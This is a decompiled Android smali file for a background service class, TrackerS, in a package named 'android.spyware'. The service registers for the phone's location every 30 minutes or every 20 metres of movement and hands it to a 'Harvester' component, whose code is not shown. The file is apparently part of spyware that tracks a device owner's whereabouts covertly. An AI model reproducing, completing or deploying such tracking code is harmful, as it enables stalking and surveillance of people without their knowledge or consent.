.class public Landroid/spyware/TrackerS;
.super Landroid/app/Service;
.source "TrackerS.java"


# static fields
.field private static final MIN_DISTANCE_CHANGE_FOR_UPDATES:J = 0x14L

.field private static final MIN_TIME_BW_UPDATES:J = 0x1b7740L


# instance fields
.field private context:Landroid/content/Context;

.field private harvester:Landroid/spyware/Harvester;

.field private mLocationListener:Landroid/location/LocationListener;

.field private mLocationManager:Landroid/location/LocationManager;


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 27
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$000(Landroid/spyware/TrackerS;)Landroid/spyware/Harvester;
    .registers 2
    .param p0, "x0"    # Landroid/spyware/TrackerS;

    .prologue
    .line 27
    iget-object v0, p0, Landroid/spyware/TrackerS;->harvester:Landroid/spyware/Harvester;

    return-object v0
.end method

.method static synthetic access$100(Landroid/spyware/TrackerS;)Landroid/content/Context;
    .registers 2
    .param p0, "x0"    # Landroid/spyware/TrackerS;

    .prologue
    .line 27
    iget-object v0, p0, Landroid/spyware/TrackerS;->context:Landroid/content/Context;

    return-object v0
.end method

.method static synthetic access$200(Landroid/spyware/TrackerS;)V
    .registers 1
    .param p0, "x0"    # Landroid/spyware/TrackerS;

    .prologue
    .line 27
    invoke-direct {p0}, Landroid/spyware/TrackerS;->setLocationListener()V

    return-void
.end method

.method private setLocationListener()V
    .registers 8

    .prologue
    const/4 v2, 0x1

    .line 100
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-lt v0, v1, :cond_23

    .line 101
    iget-object v0, p0, Landroid/spyware/TrackerS;->context:Landroid/content/Context;

    const-string v1, "android.permission.ACCESS_FINE_LOCATION"

    invoke-static {v0, v1}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_23

    iget-object v0, p0, Landroid/spyware/TrackerS;->context:Landroid/content/Context;

    const-string v1, "android.permission.ACCESS_COARSE_LOCATION"

    .line 102
    invoke-static {v0, v1}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_23

    .line 104
    const-string v0, "::trace"

    const-string v1, "::ERR  TrackerS.setLocationListener(): ACCESS_FINE_LOCATION and ACCESS_COARSE_LOCATION permissions not granted."

    invoke-static {v0, v1}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    .line 120
    :goto_22
    return-void

    .line 109
    :cond_23
    new-instance v6, Landroid/location/Criteria;

    invoke-direct {v6}, Landroid/location/Criteria;-><init>()V

    .line 111
    .local v6, "criteria":Landroid/location/Criteria;
    iget-object v0, p0, Landroid/spyware/TrackerS;->mLocationManager:Landroid/location/LocationManager;

    invoke-virtual {v0, v6, v2}, Landroid/location/LocationManager;->getBestProvider(Landroid/location/Criteria;Z)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_43

    .line 112
    iget-object v0, p0, Landroid/spyware/TrackerS;->mLocationManager:Landroid/location/LocationManager;

    iget-object v1, p0, Landroid/spyware/TrackerS;->mLocationManager:Landroid/location/LocationManager;

    .line 113
    invoke-virtual {v1, v6, v2}, Landroid/location/LocationManager;->getBestProvider(Landroid/location/Criteria;Z)Ljava/lang/String;

    move-result-object v1

    const-wide/32 v2, 0x1b7740

    const/high16 v4, 0x41a00000    # 20.0f

    iget-object v5, p0, Landroid/spyware/TrackerS;->mLocationListener:Landroid/location/LocationListener;

    .line 112
    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    goto :goto_22

    .line 119
    :cond_43
    const-string v0, "::trace"

    const-string v1, "::ERR  All the location providers are disabled."

    invoke-static {v0, v1}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_22
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 144
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .registers 3

    .prologue
    .line 38
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 40
    const-string v0, "::trace"

    const-string v1, "::INF  Tracker service running..."

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 42
    invoke-virtual {p0}, Landroid/spyware/TrackerS;->getApplication()Landroid/app/Application;

    move-result-object v0

    iput-object v0, p0, Landroid/spyware/TrackerS;->context:Landroid/content/Context;

    .line 43
    new-instance v0, Landroid/spyware/Harvester;

    iget-object v1, p0, Landroid/spyware/TrackerS;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Landroid/spyware/Harvester;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Landroid/spyware/TrackerS;->harvester:Landroid/spyware/Harvester;

    .line 44
    const-string v0, "location"

    invoke-virtual {p0, v0}, Landroid/spyware/TrackerS;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/LocationManager;

    iput-object v0, p0, Landroid/spyware/TrackerS;->mLocationManager:Landroid/location/LocationManager;

    .line 45
    new-instance v0, Landroid/spyware/TrackerS$1;

    invoke-direct {v0, p0}, Landroid/spyware/TrackerS$1;-><init>(Landroid/spyware/TrackerS;)V

    iput-object v0, p0, Landroid/spyware/TrackerS;->mLocationListener:Landroid/location/LocationListener;

    .line 96
    invoke-direct {p0}, Landroid/spyware/TrackerS;->setLocationListener()V

    .line 97
    return-void
.end method

.method public onDestroy()V
    .registers 3

    .prologue
    .line 124
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-lt v0, v1, :cond_22

    .line 125
    iget-object v0, p0, Landroid/spyware/TrackerS;->context:Landroid/content/Context;

    const-string v1, "android.permission.ACCESS_FINE_LOCATION"

    invoke-static {v0, v1}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_22

    iget-object v0, p0, Landroid/spyware/TrackerS;->context:Landroid/content/Context;

    const-string v1, "android.permission.ACCESS_COARSE_LOCATION"

    .line 126
    invoke-static {v0, v1}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_22

    .line 128
    const-string v0, "::trace"

    const-string v1, "::ERR  TrackerS.onDestroy(): ACCESS_FINE_LOCATION and ACCESS_COARSE_LOCATION permissions not granted."

    invoke-static {v0, v1}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    .line 139
    :cond_21
    :goto_21
    return-void

    .line 134
    :cond_22
    const-string v0, "::trace"

    const-string v1, "::INF  Tracker service terminated."

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 136
    iget-object v0, p0, Landroid/spyware/TrackerS;->mLocationManager:Landroid/location/LocationManager;

    if-eqz v0, :cond_21

    .line 137
    iget-object v0, p0, Landroid/spyware/TrackerS;->mLocationManager:Landroid/location/LocationManager;

    iget-object v1, p0, Landroid/spyware/TrackerS;->mLocationListener:Landroid/location/LocationListener;

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V

    goto :goto_21
.end method
